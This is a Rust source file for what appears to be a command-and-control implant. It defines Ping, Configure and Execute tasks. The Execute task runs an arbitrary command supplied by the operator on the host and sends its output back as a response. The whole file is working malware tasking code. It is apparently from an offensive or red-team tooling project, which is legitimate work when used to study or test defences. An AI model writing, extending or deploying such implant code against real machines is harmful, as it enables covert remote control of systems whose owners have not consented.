use crate::implant::Implant;
use serde::Deserialize;
use serde::Serialize;
use std::process::{Command, Output};
use uuid::Uuid;

#[derive(Deserialize, Serialize, Clone)]
pub struct Response {
    result_id: Uuid,
    contents: String,
    #[serde(serialize_with = "serialize_bool_as_string")]
    success: bool,
}

fn serialize_bool_as_string<S>(value: &bool, serializer: S) -> Result<S::Ok, S::Error>
where
    S: serde::Serializer,
{
    serializer.serialize_str(&value.to_string())
}

#[derive(Deserialize, Serialize, Clone)]
pub struct PingTask {
    #[serde(rename = "task_id")]
    id: Uuid,
}

impl PingTask {
    pub fn run(&self) -> Response {
        println!("Pinging...");
        Response {
            result_id: self.id,
            contents: String::from("PONG!"),
            success: true,
        }
    }
}

#[derive(Deserialize, Serialize, Clone, Copy)]
pub struct ConfigureTask {
    #[serde(rename = "task_id")]
    id: Uuid,
    #[serde(deserialize_with = "deserialize_f64_from_string")]
    pub dwell: f64,
    #[serde(deserialize_with = "deserialize_bool_from_string")]
    pub is_running: bool,
}

fn deserialize_bool_from_string<'de, D>(deserializer: D) -> Result<bool, D::Error>
where
    D: serde::Deserializer<'de>,
{
    let value: String = serde::Deserialize::deserialize(deserializer)?;
    match value.as_str() {
        "true" => Ok(true),
        "false" => Ok(false),
        _ => Err(serde::de::Error::custom("Invalid boolean value")),
    }
}

fn deserialize_f64_from_string<'de, D>(deserializer: D) -> Result<f64, D::Error>
where
    D: serde::Deserializer<'de>,
{
    let value: String = serde::Deserialize::deserialize(deserializer)?;
    value
        .parse::<f64>()
        .map_err(|_| serde::de::Error::custom("Invalid f64 value"))
}

impl ConfigureTask {
    pub fn run(&self) -> Response {
        println!("Configuring...");
        Response {
            result_id: self.id,
            contents: "Configuration succesful!".to_string(),
            success: true,
        }
    }
}

#[derive(Deserialize, Serialize, Clone)]
pub struct ExecuteTask {
    #[serde(rename = "task_id")]
    id: Uuid,
    command: String,
}

impl ExecuteTask {
    pub fn run(&self) -> Response {
        println!("Executing...");
        let command_output: Result<Output, std::io::Error> = Command::new(&self.command).output();

        match command_output {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                Response {
                    result_id: self.id,
                    contents: stdout,
                    success: true,
                }
            }
            Err(e) => Response {
                result_id: self.id,
                contents: e.to_string(),
                success: false,
            },
        }
    }
}

#[derive(Deserialize, Serialize, Clone)]
#[serde(tag = "task_type")]
#[serde(rename_all = "snake_case")]
pub enum Task {
    Ping(PingTask),
    Configure(ConfigureTask),
    Execute(ExecuteTask),
    // ListThreads(ListThreadsTask),
}
